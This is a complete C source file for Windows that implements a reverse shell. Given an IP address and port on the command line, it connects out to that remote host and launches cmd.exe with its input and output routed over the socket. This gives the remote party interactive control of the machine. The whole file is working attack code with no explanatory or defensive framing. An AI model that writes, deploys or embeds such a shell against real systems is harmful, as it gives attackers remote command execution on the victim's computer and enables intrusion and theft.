#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#endif

SOCKET ConnectToServer(char *ip, int port) {
  WSADATA wsa;
  SOCKET shell;
  struct sockaddr_in shell_addr;
  SOCKET connect_result;

  if (WSAStartup(MAKEWORD(2, 2), &wsa)) {
    printf("WSAStartup failed\n");
    return INVALID_SOCKET;
  }

  shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

  if (shell == INVALID_SOCKET) {
    printf("WSASocket failed\n");
    WSACleanup();
    return INVALID_SOCKET;
  }

  shell_addr.sin_port = htons(port);
  shell_addr.sin_family = AF_INET;
  shell_addr.sin_addr.s_addr = inet_addr(ip);

  connect_result = WSAConnect(shell, (struct sockaddr *)&shell_addr,
                              sizeof(shell_addr), NULL, NULL, NULL, NULL);

  if (connect_result == SOCKET_ERROR) {
    printf("Connection to server failed\n");
    closesocket(shell);
    WSACleanup();
    return INVALID_SOCKET;
  }
  return shell;
}

void RunShell(SOCKET shell) {
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  char recvServer[512];

  recv(shell, recvServer, sizeof(recvServer), 0);

  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
  si.hStdInput = (HANDLE)shell;
  si.hStdOutput = (HANDLE)shell;
  si.hStdError = (HANDLE)shell;

  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

  WaitForSingleObject(pi.hProcess, INFINITE);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
}

int main(int argc, char *argv[]) {

  if (argc != 3) {
    printf("Usage: %s <ip> <port>\n", argv[0]);
    return -1;
  }
  char *ip_addr = argv[1];
  int port = atoi(argv[2]);
  SOCKET shell = ConnectToServer(ip_addr, port);
  if (shell == INVALID_SOCKET) {
    return 1;
  }

  RunShell(shell);
  closesocket(shell);
  WSACleanup();
  return 0;
}
